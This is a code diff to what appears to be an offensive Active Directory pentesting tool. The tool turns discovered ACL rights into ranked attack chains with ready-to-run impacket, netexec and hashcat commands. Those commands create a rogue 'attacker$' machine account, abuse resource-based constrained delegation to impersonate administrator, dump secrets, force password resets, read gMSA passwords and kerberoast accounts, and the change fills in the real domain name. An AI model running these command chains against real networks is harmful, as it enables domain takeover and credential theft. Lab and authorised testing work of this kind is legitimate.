@@ -700,6 +700,8 @@ def run(report, store, ui=None):
             actor = f"{_pname}" if _pname else _psid or "<owned-user>"
             # iter-41: consolidated so every branch doesn't re-derive it
             _owned = _pname if _pname else "<owned-user>"
+            # iter-44: same for the domain substitution
+            _dom_e = store.dominant_domain() or "<dom>"
             # iter-37: DCSync rights - direct DCSync without needing to
             # gain admin first. Highest-value ACL-edge chain because it
             # yields krbtgt (which then enables R-GOLDEN at score 15).
@@ -748,7 +750,7 @@ def run(report, store, ui=None):
                     # Derive sam-style host name (no $/.fqdn) for RBCD CLI.
                     # 'WEB01.HTB.LOCAL' -> 'WEB01'; 'WEB01$' -> 'WEB01'.
                     host_short = tgt.split(".")[0].rstrip("$")
-                    fqdn = tgt if "." in tgt else f"{host_short}.<dom>"
+                    fqdn = tgt if "." in tgt else f"{host_short}.{_dom_e}"
                     chains.append(Chain("R-RBCD", "RBCD via writeable AD object",
                         f"{r}: {actor} -> {tgt} "
                         f"(RBCD -> S4U2self+U2U -> LocalSystem)",
@@ -756,14 +758,14 @@ def run(report, store, ui=None):
                         commands=[
                             f"impacket-addcomputer -computer-name 'attacker$' "
                             f"-computer-pass 'P@ssw0rd!' -dc-host <DC> "
-                            f"'<dom>/{_owned}:<password>'",
+                            f"'{_dom_e}/{_owned}:<password>'",
                             f"impacket-rbcd -delegate-from 'attacker$' "
                             f"-delegate-to '{host_short}$' -action write "
-                            f"'<dom>/{_owned}:<password>'",
+                            f"'{_dom_e}/{_owned}:<password>'",
                             f"impacket-getST -spn 'cifs/{fqdn}' "
-                            f"-impersonate administrator '<dom>/attacker$:P@ssw0rd!'",
+                            f"-impersonate administrator '{_dom_e}/attacker$:P@ssw0rd!'",
                             f"export KRB5CCNAME=administrator.ccache; "
-                            f"impacket-secretsdump -k -no-pass '<dom>/administrator@{fqdn}'",
+                            f"impacket-secretsdump -k -no-pass '{_dom_e}/administrator@{fqdn}'",
                         ], src=edge["src"], line=edge["line"]))
                 else:
                     chains.append(Chain("R-WRITEDACL", "force-change-password via writeable user",
@@ -771,7 +773,7 @@ def run(report, store, ui=None):
                         crit=7, conf=0.7, ready=1.3, prox=0.85,     # score 5.42
                         commands=[
                             f"net rpc password '{tgt}' '<NewP@ss123!>' "
-                            f"-U '<dom>/{_owned}%<password>' -S <DC>",
+                            f"-U '{_dom_e}/{_owned}%<password>' -S <DC>",
                             f"netexec smb <DC> -u '{tgt}' -p '<NewP@ss123!>' --shares",
                         ], src=edge["src"], line=edge["line"]))
             elif r == "ForceChangePassword":
@@ -780,7 +782,7 @@ def run(report, store, ui=None):
                     crit=7, conf=0.8, ready=1.4, prox=0.85,         # score 6.66
                     commands=[
                         f"net rpc password '{tgt}' '<NewP@ss123!>' "
-                        f"-U '<dom>/{_owned}%<password>' -S <DC>",
+                        f"-U '{_dom_e}/{_owned}%<password>' -S <DC>",
                     ], src=edge["src"], line=edge["line"]))
             elif r == "ReadGMSAPassword":
                 chains.append(Chain("R-GMSA-READ", "read gMSA password",
@@ -789,7 +791,7 @@ def run(report, store, ui=None):
                     commands=[
                         f"netexec ldap <DC> -u '{_owned}' -p '<password>' --gmsa",
                         f"# or: impacket-gMSADumper -u '{_owned}' "
-                        f"-p '<password>' -d '<dom>' -l <DC>",
+                        f"-p '<password>' -d '{_dom_e}' -l <DC>",
                     ], src=edge["src"], line=edge["line"]))
             elif r == "ReadLAPSPassword":
                 chains.append(Chain("R-LAPS-READ", "read LAPS password",
@@ -805,7 +807,7 @@ def run(report, store, ui=None):
                     crit=6, conf=0.7, ready=1.3, prox=0.8,
                     commands=[
                         f"impacket-net rpc group addmem '{tgt}' '{_owned}' "
-                        f"-U '<dom>/{_owned}%<password>' -S <DC>",
+                        f"-U '{_dom_e}/{_owned}%<password>' -S <DC>",
                     ], src=edge["src"], line=edge["line"]))
             elif r == "WriteSPN":
                 # iter-41: targeted kerberoast. WriteSPN lets us set an SPN
@@ -817,10 +819,10 @@ def run(report, store, ui=None):
                     f"(set fake SPN -> kerberoast -> crack {tgt})",
                     crit=8, conf=0.85, ready=1.4, prox=0.9,       # score 8.57
                     commands=[
-                        f"impacket-addspn -u '<dom>\\{_owned}' -p '<password>' "
+                        f"impacket-addspn -u '{_dom_e}\\{_owned}' -p '<password>' "
                         f"-t '{tgt}' -s 'HTTP/kerberoast' <DC>",
                         f"impacket-GetUserSPNs -request-user '{tgt}' "
-                        f"-dc-ip <DC> '<dom>/{_owned}:<password>' | tee tgs.txt",
+                        f"-dc-ip <DC> '{_dom_e}/{_owned}:<password>' | tee tgs.txt",
                         "hashcat -m 13100 tgs.txt rockyou.txt -r best64.rule",
                         "# then PtH the recovered NT hash (see R7)",
                     ], src=edge["src"], line=edge["line"]))
